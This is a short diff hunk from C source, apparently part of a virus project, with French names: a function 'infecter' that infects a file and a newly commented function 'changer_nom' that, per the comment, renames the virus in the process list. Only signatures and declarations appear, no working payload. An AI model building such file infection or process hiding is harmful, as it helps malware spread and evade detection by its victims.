@@ -71,6 +71,7 @@ _Bool infecter(char fichier[256], int ligne){
 	return 0;
 }
 
+//On change le nom du virus dans les processus
 void changer_nom(){
 	int nb;
 	struct dirent **liste;
